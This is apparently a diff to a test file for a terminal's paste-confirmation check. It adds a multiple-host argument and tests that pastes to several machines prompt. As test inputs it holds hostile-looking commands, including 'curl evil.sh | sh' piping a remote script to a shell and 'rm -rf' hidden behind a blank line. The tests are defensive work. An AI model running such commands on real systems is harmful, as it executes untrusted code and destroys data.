@@ -124,30 +124,42 @@ describe('when a paste has to be shown first', () => {
     /* Bracketed paste is the real fix. The shell asked for it, xterm wraps the
        text, and none of it is read as commands. Asking anyway would train
        people to click through the one prompt that matters. */
-    expect(pasteNeedsConfirming('cd /tmp\ncurl evil.sh | sh\n', true)).toBe(false);
+    expect(pasteNeedsConfirming('cd /tmp\ncurl evil.sh | sh\n', true, false)).toBe(false);
   });
 
   it('asks about more than one line when it has not', () => {
-    expect(pasteNeedsConfirming('cd /tmp\ncurl evil.sh | sh', false)).toBe(true);
+    expect(pasteNeedsConfirming('cd /tmp\ncurl evil.sh | sh', false, false)).toBe(true);
   });
 
   it('stays quiet for one command, however it ends', () => {
     /* Pasting a single command and expecting it to run is the ordinary case,
        and a trailing newline is part of it. */
-    expect(pasteNeedsConfirming('ls -la', false)).toBe(false);
-    expect(pasteNeedsConfirming('ls -la\n', false)).toBe(false);
-    expect(pasteNeedsConfirming('ls -la\r\n', false)).toBe(false);
+    expect(pasteNeedsConfirming('ls -la', false, false)).toBe(false);
+    expect(pasteNeedsConfirming('ls -la\n', false, false)).toBe(false);
+    expect(pasteNeedsConfirming('ls -la\r\n', false, false)).toBe(false);
   });
 
   it('asks when the break is in the middle, whatever the line ending', () => {
     for (const text of ['a\nb', 'a\r\nb', 'a\rb']) {
-      expect(pasteNeedsConfirming(text, false), JSON.stringify(text)).toBe(true);
+      expect(pasteNeedsConfirming(text, false, false), JSON.stringify(text)).toBe(true);
     }
   });
 
   it('asks about a blank line hiding a second command', () => {
     /* The shape of the trick: it looks like one line and a bit of whitespace. */
-    expect(pasteNeedsConfirming('echo safe\n\nrm -rf /tmp/x\n', false)).toBe(true);
+    expect(pasteNeedsConfirming('echo safe\n\nrm -rf /tmp/x\n', false, false)).toBe(true);
+  });
+
+  it('asks about every paste that reaches more than one host', () => {
+    /* Bracketed paste stops the shell running the lines. It stops nothing
+       about the paste landing on four production machines because the wrong
+       pane had focus, so one line under brackets still earns the question. */
+    expect(pasteNeedsConfirming('ls -la', true, true)).toBe(true);
+    expect(pasteNeedsConfirming('ls -la', false, true)).toBe(true);
+  });
+
+  it('still says nothing about pasting nothing', () => {
+    expect(pasteNeedsConfirming('', true, true)).toBe(false);
   });
 });
 
